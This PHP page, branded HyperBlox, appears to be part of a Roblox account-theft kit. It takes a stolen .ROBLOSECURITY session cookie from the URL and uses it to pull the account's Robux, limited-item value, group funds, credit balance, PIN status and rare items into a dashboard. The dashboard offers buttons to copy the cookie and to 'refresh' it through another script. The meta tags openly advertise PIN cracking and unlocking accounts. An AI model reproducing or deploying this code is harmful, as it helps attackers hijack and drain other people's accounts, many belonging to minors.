<?php
$cookie = $_GET['cookie'];

function makeRequest($url, $headers, $postData = null) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    if ($postData) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
    }
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}

$headers = ["Cookie: .ROBLOSECURITY=$cookie", "Content-Type: application/json"];

$settingsData = makeRequest("https://www.roblox.com/my/settings/json", $headers);
$userId = $settingsData['UserId'];

$userInfoData = makeRequest("https://users.roblox.com/v1/users/$userId", $headers);

$transactionSummaryData = makeRequest("https://economy.roblox.com/v2/users/$userId/transaction-totals?timeFrame=Year&transactionType=summary", $headers);
$summary = isset($transactionSummaryData['purchasesTotal']) ? abs($transactionSummaryData['purchasesTotal']) : 'Unknown';

$avatarData = file_get_contents("https://thumbnails.roblox.com/v1/users/avatar?userIds=$userId&size=150x150&format=Png&isCircular=false");
$avatarJson = json_decode($avatarData, true);
$avatarUrl = $avatarJson['data'][0]['imageUrl'] ?? 'https://www.roblox.com/headshot-thumbnail/image/default.png';

$balanceData = makeRequest("https://economy.roblox.com/v1/users/$userId/currency", $headers);
$robux = $balanceData['robux'] ?? 0;
$pendingRobux = $transactionSummaryData['pendingRobuxTotal'] ?? 'Unknown';

$collectiblesData = makeRequest("https://inventory.roblox.com/v1/users/$userId/assets/collectibles?limit=100", $headers);
$rap = 0;
if (isset($collectiblesData['data'])) {
    foreach ($collectiblesData['data'] as $item) {
        $rap += $item['recentAveragePrice'];
    }
}

$pinData = makeRequest("https://auth.roblox.com/v1/account/pin", $headers);
$pinStatus = isset($pinData['isEnabled']) ? ($pinData['isEnabled'] ? '✅ True' : '❌ False') : '❓ Unknown';

$vcData = makeRequest("https://voice.roblox.com/v1/settings", $headers);
$vcStatus = isset($vcData['isVoiceEnabled']) ? ($vcData['isVoiceEnabled'] ? '✅ True' : '❌ False') : '❓ Unknown';

function ownsBundle($userId, $bundleId, $headers) {
    $url = "https://inventory.roblox.com/v1/users/$userId/items/3/$bundleId";
    $response = makeRequest($url, $headers);
    return isset($response['data']) && !empty($response['data']);
}

$hasHeadless = ownsBundle($userId, 201, $headers);
$hasKorblox = ownsBundle($userId, 192, $headers);
$headlessStatus = $hasHeadless ? '✅ True' : '❌ False';
$korbloxStatus = $hasKorblox ? '✅ True' : '❌ False';

$accountCreated = isset($userInfoData['created']) ? strtotime($userInfoData['created']) : null;
$accountAge = '❓ Unknown';
if ($accountCreated) {
    $days = floor((time() - $accountCreated) / (60 * 60 * 24));
    $accountAge = "$days days";
}

$friendsData = makeRequest("https://friends.roblox.com/v1/users/$userId/friends/count", $headers);
$friendsCount = $friendsData['count'] ?? '❓ Unknown';

$followersData = makeRequest("https://friends.roblox.com/v1/users/$userId/followers/count", $headers);
$followersCount = $followersData['count'] ?? '❓ Unknown';

$groupsData = makeRequest("https://groups.roblox.com/v2/users/$userId/groups/roles", $headers);
$ownedGroups = [];
if (isset($groupsData['data'])) {
    foreach ($groupsData['data'] as $group) {
        if ($group['role']['rank'] == 255) {
            $ownedGroups[] = $group;
        }
    }
}
$totalGroupsOwned = count($ownedGroups);

$totalGroupFunds = 0;
$totalPendingGroupFunds = 0;
foreach ($ownedGroups as $group) {
    $groupId = $group['group']['id'];
    $groupFunds = makeRequest("https://economy.roblox.com/v1/groups/$groupId/currency", $headers);
    $totalGroupFunds += $groupFunds['robux'] ?? 0;

    $groupPayouts = makeRequest("https://economy.roblox.com/v1/groups/$groupId/payouts", $headers);
    if (isset($groupPayouts['data'])) {
        foreach ($groupPayouts['data'] as $payout) {
            if ($payout['status'] === 'Pending') {
                $totalPendingGroupFunds += $payout['amount'];
            }
        }
    }
}

$creditBalanceData = makeRequest("https://billing.roblox.com/v1/credit", $headers);
$creditBalance = isset($creditBalanceData['balance']) ? $creditBalanceData['balance'] : '❓ Unknown';
$creditRobux = isset($creditBalanceData['robuxAmount']) ? $creditBalanceData['robuxAmount'] : '❓ Unknown';

$emailVerified = isset($settingsData['IsEmailVerified']) ? ($settingsData['IsEmailVerified'] ? '✅ True' : '❌ False') : '❓ Unknown';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="author" content="HyperBlox">
    <meta name="description" content="HyperBlox - The best Roblox tools for game copying, clothing duplication, bot followers, and PIN cracking, all free and secure.">
    <meta name="keywords" content="Roblox, HyperBlox, game copier, clothing copier, bot followers, PIN cracker, safe Roblox tools, automation">
    <meta name="robots" content="index, follow">
    <meta property="og:title" content="HyperBlox - The Best Roblox Tools">
    <meta property="og:description" content="Copy games, duplicate clothes, gain followers, and unlock Roblox accounts with HyperBlox's powerful and safe tools.">
    <meta property="og:image" content="https://undetectedgoons.lol/files/hyperblox.png">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://hyperblox.eu/">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="HyperBlox - The Best Roblox Tools">
    <meta name="twitter:site" content="https://hyperblox.eu/">
    <meta name="twitter:description" content="Copy games, duplicate clothes, gain followers, and unlock Roblox accounts with HyperBlox's powerful and safe tools.">
    <meta name="twitter:image" content="https://undetectedgoons.lol/files/hyperblox.png">
    <meta name="theme-color" content="#000000">
    <meta name="msapplication-TileColor" content="#000000">
    <meta itemprop="name" content="HyperBlox">
    <meta itemprop="description" content="HyperBlox - Advanced Roblox tools for copying games, cloning outfits, and more.">
    <title>HyperBlox Cookie Info</title>
    <link rel="icon" type="image/png" href="https://undetectedgoons.lol/files/hyperblox.png">
    <link rel="shortcut icon" href="https://undetectedgoons.lol/files/hyperblox.ico">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700&display=swap">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
    <style>
        :root {
            --primary: #8b5cf6;
            --primary-dark: #7c3aed;
            --primary-light: #a78bfa;
            --dark: #0f172a;
            --darker: #020617;
            --darkest: #010510;
            --light: #f8fafc;
            --gray: #94a3b8;
            --glass: rgba(30,41,59,0.45);
            --glass-border: rgba(255,255,255,0.08);
            --transition: all 0.3s cubic-bezier(0.4,0,0.2,1);
            --shadow-lg: 0 15px 50px rgba(0,0,0,0.25);
            --border-radius: 16px;
            --glow: 0 0 40px rgba(139,92,246,0.4);
        }

        body {
            font-family: 'Manrope', sans-serif;
            background: var(--darkest);
            color: var(--light);
            min-height: 100vh;
            margin: 0;
            background-image: 
                radial-gradient(at 80% 0%, rgba(139,92,246,0.1) 0%, transparent 50%),
                radial-gradient(at 0% 50%, rgba(139,92,246,0.1) 0%, transparent 50%);
        }

        .container {
            width: 100%;
            max-width: 1200px;
            margin: 0 auto;
            padding: 40px 20px;
        }

        .header {
            text-align: center;
            margin-bottom: 40px;
        }

        .header-title {
            font-size: 36px;
            font-weight: 700;
            margin-bottom: 10px;
            background: linear-gradient(90deg, #8b5cf6, #ec4899);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .user-card {
            background: var(--glass);
            border-radius: var(--border-radius);
            padding: 30px;
            border: 1px solid var(--glass-border);
            backdrop-filter: blur(12px);
            box-shadow: var(--shadow-lg), var(--glow);
            margin-bottom: 30px;
            display: flex;
            align-items: center;
            gap: 30px;
        }

        .user-avatar {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            object-fit: cover;
            border: 3px solid var(--primary);
        }

        .user-info {
            flex: 1;
        }

        .user-name {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 5px;
        }

        .user-username {
            color: var(--gray);
            font-size: 18px;
            margin-bottom: 15px;
        }

        .user-stats {
            display: flex;
            gap: 20px;
        }

        .stat-item {
            text-align: center;
        }

        .stat-value {
            font-size: 20px;
            font-weight: 700;
            color: var(--primary);
        }

        .stat-label {
            font-size: 14px;
            color: var(--gray);
        }

        .cookie-section {
            background: var(--glass);
            border-radius: var(--border-radius);
            padding: 30px;
            border: 1px solid var(--glass-border);
            backdrop-filter: blur(12px);
            box-shadow: var(--shadow-lg), var(--glow);
            margin-bottom: 30px;
        }

        .section-title {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 20px;
            color: var(--light);
        }

        .cookie-display {
            width: 100%;
            background: rgba(15,23,42,0.7);
            border: 1px solid var(--glass-border);
            border-radius: var(--border-radius);
            padding: 15px;
            color: var(--light);
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 20px;
            word-break: break-all;
            max-height: 120px;
            overflow-y: auto;
            font-family: monospace;
        }

        .button-group {
            display: flex;
            gap: 15px;
        }

        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            padding: 12px 24px;
            border-radius: var(--border-radius);
            font-weight: 600;
            transition: var(--transition);
            cursor: pointer;
            font-size: 15px;
            border: none;
            gap: 8px;
        }

        .btn-primary {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            color: white;
            box-shadow: 0 4px 15px rgba(139,92,246,0.3);
        }

        .btn-primary:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(139,92,246,0.4);
        }

        .btn-outline {
            border: 1px solid var(--glass-border);
            color: var(--gray);
            background: var(--glass);
        }

        .btn-outline:hover {
            border-color: var(--primary);
            color: var(--light);
            background: rgba(139,92,246,0.1);
        }

        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 20px;
            margin-top: 30px;
        }

        .info-card {
            background: var(--glass);
            border-radius: var(--border-radius);
            padding: 20px;
            border: 1px solid var(--glass-border);
            transition: var(--transition);
        }

        .info-card:hover {
            transform: translateY(-5px);
            border-color: var(--primary);
        }

        .info-title {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 10px;
            color: var(--gray);
        }

        .info-value {
            font-size: 18px;
            font-weight: 700;
            color: var(--light);
        }

        .swal2-popup {
            background: var(--darker) !important;
            border-radius: var(--border-radius) !important;
            border: 1px solid var(--glass-border) !important;
            box-shadow: var(--shadow-lg), var(--glow) !important;
            padding: 30px !important;
            backdrop-filter: blur(12px) !important;
        }

        .swal2-title {
            color: var(--light) !important;
            font-size: 22px !important;
            font-weight: 700 !important;
        }

        .swal2-html-container {
            color: var(--gray) !important;
            font-size: 15px !important;
        }

        .swal2-confirm {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark)) !important;
            border-radius: 10px !important;
            padding: 10px 24px !important;
            font-weight: 600 !important;
        }

        @media (max-width: 768px) {
            .user-card {
                flex-direction: column;
                text-align: center;
            }
            
            .user-stats {
                justify-content: center;
            }
            
            .button-group {
                flex-direction: column;
            }
            
            .info-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1 class="header-title">Cookie Information</h1>
        </div>
        
        <div class="user-card">
            <img src="<?php echo $avatarUrl; ?>" alt="User Avatar" class="user-avatar">
            <div class="user-info">
                <h2 class="user-name"><?php echo $userInfoData['displayName']; ?></h2>
                <p class="user-username">@<?php echo $userInfoData['name']; ?></p>
                <div class="user-stats">
                    <div class="stat-item">
                        <div class="stat-value"><?php echo $robux; ?></div>
                        <div class="stat-label">Robux</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value"><?php echo $rap; ?></div>
                        <div class="stat-label">RAP</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value"><?php echo $friendsCount; ?></div>
                        <div class="stat-label">Friends</div>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="cookie-section">
            <h3 class="section-title">Cookie Data</h3>
            <div class="cookie-display" id="cookieTextarea"><?php echo $cookie; ?></div>
            <div class="button-group">
                <button class="btn btn-primary" onclick="copyCookie()">
                    <i class="fas fa-copy"></i>
                    Copy Cookie
                </button>
                <button class="btn btn-outline" onclick="refreshCookie()">
                    <i class="fas fa-sync-alt"></i>
                    Refresh Cookie
                </button>
            </div>
        </div>
        
        <div class="info-grid">
            <div class="info-card">
                <div class="info-title">User ID</div>
                <div class="info-value"><?php echo $userId; ?></div>
            </div>
            <div class="info-card">
                <div class="info-title">Pending Robux</div>
                <div class="info-value"><?php echo $pendingRobux; ?></div>
            </div>
            <div class="info-card">
                <div class="info-title">Account Summary</div>
                <div class="info-value"><?php echo $summary; ?></div>
            </div>
            <div class="info-card">
                <div class="info-title">Account PIN</div>
                <div class="info-value"><?php echo $pinStatus; ?></div>
            </div>
            <div class="info-card">
                <div class="info-title">Premium Status</div>
                <div class="info-value"><?php echo $settingsData['IsPremium'] ? '✅ True' : '❌ False'; ?></div>
            </div>
            <div class="info-card">
                <div class="info-title">Voice Chat</div>
                <div class="info-value"><?php echo $vcStatus; ?></div>
            </div>
            <div class="info-card">
                <div class="info-title">Headless Horseman</div>
                <div class="info-value"><?php echo $headlessStatus; ?></div>
            </div>
            <div class="info-card">
                <div class="info-title">Korblox Deathspeaker</div>
                <div class="info-value"><?php echo $korbloxStatus; ?></div>
            </div>
            <div class="info-card">
                <div class="info-title">Account Age</div>
                <div class="info-value"><?php echo $accountAge; ?></div>
            </div>
            <div class="info-card">
                <div class="info-title">Followers</div>
                <div class="info-value"><?php echo $followersCount; ?></div>
            </div>
            <div class="info-card">
                <div class="info-title">Groups Owned</div>
                <div class="info-value"><?php echo $totalGroupsOwned; ?></div>
            </div>
            <div class="info-card">
                <div class="info-title">Group Funds</div>
                <div class="info-value"><?php echo $totalGroupFunds; ?> Robux</div>
            </div>
            <div class="info-card">
                <div class="info-title">Pending Group Funds</div>
                <div class="info-value"><?php echo $totalPendingGroupFunds; ?> Robux</div>
            </div>
            <div class="info-card">
                <div class="info-title">Credit Balance</div>
                <div class="info-value">$<?php echo $creditBalance; ?></div>
            </div>
            <div class="info-card">
                <div class="info-title">Credit Robux</div>
                <div class="info-value"><?php echo $creditRobux; ?></div>
            </div>
            <div class="info-card">
                <div class="info-title">Email Verified</div>
                <div class="info-value"><?php echo $emailVerified; ?></div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script>
        function copyCookie() {
            const cookieTextarea = document.getElementById('cookieTextarea');
            navigator.clipboard.writeText(cookieTextarea.textContent)
                .then(() => {
                    Swal.fire({
                        icon: 'success',
                        title: 'Copied!',
                        text: 'Cookie copied to clipboard',
                    });
                })
                .catch(err => {
                    Swal.fire({
                        icon: 'error',
                        title: 'Error',
                        text: 'Failed to copy cookie',
                    });
                });
        }

        async function refreshCookie() {
            const cookie = document.getElementById('cookieTextarea').textContent;
            try {
                const response = await fetch('refresh.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: `cookie=${encodeURIComponent(cookie)}`
                });
                const data = await response.json();
                
                if (data.success) {
                    document.getElementById('cookieTextarea').textContent = data.cookie;
                    Swal.fire({
                        icon: 'success',
                        title: 'Success!',
                        text: 'Cookie has been refreshed',
                    });
                } else {
                    Swal.fire({
                        icon: 'error',
                        title: 'Error',
                        text: data.error || 'Failed to refresh cookie',
                    });
                }
            } catch (error) {
                Swal.fire({
                    icon: 'error',
                    title: 'Connection Error',
                    text: 'Failed to connect to server',
                });
            }
        }
    </script>
</body>
</html>